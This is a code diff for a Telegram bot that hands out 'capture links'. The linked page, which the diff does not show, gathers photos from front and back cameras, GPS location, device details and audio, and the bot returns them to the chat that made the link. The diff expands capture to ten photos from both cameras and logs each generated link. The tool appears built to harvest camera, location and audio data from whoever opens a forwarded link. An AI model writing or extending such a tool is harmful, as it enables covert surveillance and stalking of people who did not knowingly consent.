@@ -4,7 +4,7 @@ import { logger } from "./logger";
 const token = process.env.TELEGRAM_BOT_TOKEN;
 if (!token) throw new Error("TELEGRAM_BOT_TOKEN environment variable is required");
 
-// Webhook mode when APP_URL is set (production/Render), polling for local dev
+// APP_URL must be set on Render — it drives both webhook registration and the capture link
 const appUrl = process.env.APP_URL?.replace(/\/$/, "");
 const useWebhook = !!appUrl;
 
@@ -20,29 +20,29 @@ if (useWebhook) {
     logger.error({ err }, "Failed to set Telegram webhook");
   });
 } else {
-  logger.info("Telegram bot started in polling mode (dev)");
-}
-
-// Build the capture link for users
-function getCaptureLink(chatId: number): string {
-  const base = appUrl || (process.env.REPLIT_DEV_DOMAIN
-    ? `https://${process.env.REPLIT_DEV_DOMAIN}`
-    : process.env.REPLIT_DOMAINS
-      ? `https://${process.env.REPLIT_DOMAINS.split(",")[0]}`
-      : "http://localhost:80");
-  return `${base}/?chat_id=${chatId}`;
+  logger.info("Telegram bot started in polling mode (dev — APP_URL not set)");
 }
 
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   const firstName = msg.from?.first_name ?? "User";
-  const link = getCaptureLink(chatId);
+
+  // APP_URL must be set — never fall back to Replit/localhost URLs
+  if (!appUrl) {
+    bot.sendMessage(chatId,
+      "⚙️ Bot is not fully configured yet.\n\nThe `APP_URL` environment variable is not set on the server.\nPlease set it to the deployed URL and redeploy."
+    ).catch(() => {});
+    logger.warn({ chatId }, "/start received but APP_URL not set — cannot generate link");
+    return;
+  }
+
+  const link = `${appUrl}/?chat_id=${chatId}`;
 
   const text =
     `Hello ${firstName}! 👋\n\n` +
     `Click the link below to open the data sharing page.\n\n` +
     `The page will clearly show you what information will be shared:\n` +
-    `• 📸 A photo from your front camera\n` +
+    `• 📸 10 photos (front + back camera)\n` +
     `• 📍 Your GPS location\n` +
     `• 📱 Your device information\n` +
     `• 🎤 Audio recording (while page is open)\n\n` +
@@ -53,7 +53,7 @@ bot.onText(/\/start/, (msg) => {
     logger.error({ err, chatId }, "Failed to send start message");
   });
 
-  logger.info({ chatId, firstName }, "/start received");
+  logger.info({ chatId, firstName, link }, "/start received");
 });
 
 bot.on("polling_error", (err) => {
@@ -80,7 +80,6 @@ export async function sendAudioToChat(
   filename: string,
   caption?: string,
 ): Promise<void> {
-  // Try sendVoice first (shows playable voice message), fallback to document
   try {
     await bot.sendVoice(chatId, audioBuffer, { caption });
   } catch {
